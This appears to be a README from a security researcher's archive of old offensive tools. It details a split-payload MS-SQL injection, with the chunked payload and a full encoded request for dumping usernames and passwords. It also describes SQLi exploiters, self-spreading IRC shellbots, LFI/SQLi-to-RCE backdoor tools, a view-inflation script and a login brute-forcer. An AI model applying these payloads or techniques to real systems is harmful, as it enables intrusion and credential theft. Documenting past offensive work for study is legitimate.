## SQLIs

### SQLIs/SQLi Split-Payload Exploit - [Link](https://github.com/gosirys/Memorabilia/tree/main/SQLIs/mssql-dump-splitPayload.pl)

This was coded to exploit a tricky SQL Injection vulnerability I found in one of my earliest pentest in 2011. The affected  resource had 6 vulnerable parameters, each one with a max-length enforced server-side causing all payloads being truncated after x chars.
Since it was a error-based SQLi, I could see the resulting query when it was failing due to syntax errors caused by the input truncation.
This allowed me to discover that all the parameters were ending in the same SQL query, therefore to successfully exploit the vulnerability technically I could have split each payload into smaller chunks, inject each of them in parameters based on their order of appareance in the original query, and use comments to have parts pf the original query ignored and by doing so concatenating each of the injected chunks and so rebuilding the payload.
This was done by adding a "start comment" at the end of a parameter's payload's chunk, and a "end comment" at the beginning of following parameter's injection.

An example of what the original query could have looked like (yes I lost the original report and all I have left is the exploit code which I coded 10 years ago):

```sql
SELECT x,z FROM TABLE WHERE Param1 = '$input_1' AND Param2 = '$input_2' AND Param3 = '$input_3' AND Param4 = '$input_4' AND Param5 = '$input_5' AND Param6 = '$input_6' ORDER BY x DESC
```

An example payload of interest would be to disclose sensitive columns from a specific table and database. For instance, following a prior enumeration of the targeted database's schema, one might want to obtain records of the columns `user,pass` from the table `users` of database currently in use by the application.

Such a payload could look like the following:
```sql
' union select top 1 null,convert(int,user,pass) from users_table where user,pass not in (select top 1 user,pass from users_table)--ORDER BY x DESC
```

A successful injection could then be achieved by splitting the payload in `x` chunks based on the inputs' length limitation and amount of affected parameters. In this case, 6 parameters were vulnerable, and according to the exploit I wrote it seems that all inputs had a different maximum length enforced server-side. In the specific case of this application, the payload could be split amongtst the parameters as shown below:

Param1=`' union select top 1 null,/*`
Param2=`*/convert(int,user,pass) from /*`
Param3=`*/users_table where user,pass/*`
Param4=`*/ not /*`
Param5=`*/in /*`
Param6=`*/(select top 1 user,pass from users_table)--`

The final URL would then be something like:
```
https://site.com/vuln_resource?Param1=%27%20union%20select%20top%201%20null%2C%2F%2A&Param2=%2A%2Fconvert%28int%2Cuser%2Cpass%29%20from%20%2F%2A&Param3=%2A%2Fusers_table%20where%20user%2Cpass%2F%2A&Param4=%2A%2F%20not%20%2F%2A&Param5=%2A%2Fin%20%2F%2A&Param6=%2A%2F%28select%20top%201%20user%2Cpass%20from%20users_table%29--
```

Once requested, the injected chuncks would end up in the affected SQL query, which would then become something like:
```sql
SELECT x,z FROM TABLE WHERE Param1 = '' union select top 1 null,/*' AND Param2 = '*/convert(int,user,pass) from /*' AND Param3 = '*/users_table where user,pass/*' AND Param4 = '*/ not /*' AND Param5 = '*/in /*' AND Param6 = '*/(select top 1 user,pass from users_table)--'
```

Once processed by the DBMS, in this case it was MS-SQL, the parts in between comments would be ignored making the final query to be executed the one below:

```sql
SELECT x,z FROM TABLE WHERE Param1 = '' union select top 1 null,convert(int,user,pass) from users_table where user,pass not in (select top 1 user,pass from users_table)--ORDER BY x DESC
```

The query would cause a MS-SQL error - forced by asking the DBMS to convert columns of type varchar to Int: `convert(int,user,pass)` - to be displayed on the page and disclose the username and passoword of the first user in the `users_table` table.

That is it, the rest of the logic including all queries to extract all databases, tables and columns and final dump of columns/tables of interest can be found in the exploit.

***Disclaimer***
The above explanation was written over 10 years after the vulnerability was found and its exploit written - therefore do not expect every single bit to perfectly accurate as I had to extrapolate the inner workings by re-reading my exploit code. However should be enough to give an idea of it all.
Moreover, even though SQLmap already existed at the time, I'm not quite sure it could be used to semi-automatically exploit a vulnerability of this kind - hence I had to write all this to achieve the objective.











###  SQLIs/yInjector - [Link](https://github.com/gosirys/Offensive/blob/main/SQLIs/yInjector/v1.5/yinjector.pl)
#### History
I developed this tool sometime in 2010. Having a thing for doing source code review and SQL Injections I thought I to write my own tool to help me identify and exploit this class of vulnerabilities.

#### Features
* HTTP Methods: GET/POST with support for Cookies
* DBMS: limited to MySQL
* HTTP Proxy Support
* Log File for debugging
* Main Features:
	* Automatic detection of vulnerable parameters
	* Payloads style attack: Error Based and Union Select
	* Automatic payload creation 
	* Assisted and automated database(s)* rows dump
* Advanced Exploitation modules:
	* Internal Absolute File System Path identification module - required for the RCE module
	* Local File Disclosure module by leveraging FILE privileges and MySQL `load_file` function
	* Remote Code Execution module by abusing FILE privileges MySQL `into dumpfile` function
	* MD5 Hashes assitive cracking through Online password cracking services 

#### Disclaimer
Development of this tool stopped right after I discovered how powerful SQLmap had become as right in these time it already supported several DBMS and Injection techniques (Error, Boolean Blind, Time-Based Blind, Stacked, etc).
Kudos to the guys behind [sqlmap](https://github.com/sqlmapproject/sqlmap)



## IRC-Bots

###  IRC-Bots/v6 Shellbot - [Link](https://github.com/gosirys/Offensive/blob/main/IRC-Bots/v6-IRC-Shellbot/v6.txt)
#### Some History
Around 2007-2010 Remote File Inclusion (RFI) was a widespread vulnerability, mostly affecting Web Applications written in PHP. It was around 2007 that I stumbled upon some clandestines underground IRC servers ran by questionable individuals the likes of "Mafia<something>" (can't recall his nick) - where they had IRCBots running in their channels. Those bots were coded to scan the web using dorks to find sites built with certain CMS for which there was a known vulnerability and a working PoC - and run the PoC against every search's result to hack as many sites as possible. I remember liking the colors of those bots and that some of these were sold for thousands of Euros. I then happened to find the source code of one of these bots left on a hacked server. Shortly after i started practing by modding them and ultimately ended up learning Perl to write my first bot (v5) - followed by its main successor the v6. At the time, the v6 became one of the most widely used IRC shellbots in circulation.
	
#### Main features

* Vulnerability classes supported:
	* SQL Injection
	* RFI (Remote File Inclusion)
	* LFI/LFD (Local File Inclusion/Disclosure)
	* RCE (Remote Code Execution)
* Search Engines:
	* Mass Scan, Google, AlltheWeb, Yahoo, Msn
	* TLDs: .at/.com.au/.com.br/.ca/.ch/.cn/.de/.dk/.es/.fr/.it/.co.jp/.com.mx/.co.uk
	* Bypass support: Google and Yahoo
* Advanced Features:
	* Integrated OS-shell, RCE on the box running the bot
	* Security Mode to protect "dangerous" functions (OS-Shell)
	* Spread Mode, enable/disable bot's self replication on sites vulnerable to RFI/RCE
	* Single Spread Mode, to enable its self-replication on individual sites


### IRC-Bots/v5 Shellbot - [Link](https://github.com/gosirys/Offensive/blob/main/IRC-Bots/v5-IRC-Shellbot/v5_01.txt)

This was my first ever program in Perl, which I coded discovering the source code of one of the popular bots at the time and learning how poorly it was coded. Similar in functionalities to its successor (v6 Shellbot) but with fewer features and more bugs.



## Misc

### Misc/From LFI to RCE - [Link](https://github.com/gosirys/Offensive/tree/main/Misc/LFI2RCE.pl)
This tool was coded to leverage a technique known as Log Poisoning in combination with Local FIle Inclusion vulnerabilities. By injecting PHP code in the URL query string or User-Agent, some insecured Apache configuration would store the PHP code without any sanitisation in log files. The Local File Inclusion vulnerability would then be used against a dictionary of typical paths of Apache log files. Finding the correct path of the poisoned log file would then result in Remote Code Execution.


### Misc/From SQL Injection to RCE - [Link](https://github.com/gosirys/Offensive/tree/main/Misc/SQLi2RCE.pl)
Simple script to escalate SQL Injection vulnerabilities into Remote Code Execution.
The tool worked by requesting a non-existent path on the affected site, to then use (if privileges allowed) the MySQL `load_file` function through the provided SQL Injection PoC, running through a dictionary of typical internal paths for Apache's error logs. Should the error log be found, the tool would then extract the absolute file system internal path looking for the non-esisting path initially requested. By knowing the exact internal file system path of the document root of the affected application, the tool would then try to use the MySQL `into dumpfile` function to create a PHP backdoor in the site's document root.


### Misc/Views Freaker - [Link](https://github.com/gosirys/Offensive/tree/main/Misc/views_freaker.pl)
Simple script to issues many HTTP requests to a given page through a multitude of Proxies.
Mainly used to increase the "hits/views" on websites pages.


### Misc/Remote Bruter k7 - [Link](https://github.com/gosirys/Offensive/tree/main/Misc/RemoteBruter-k7.pl)
A tool to perform login bruteforce through dictionary-based attacks against FTP, TELNET and SSH services.
Supporting parallel-processing and useable through a CLI interface or as IRC bot.
  
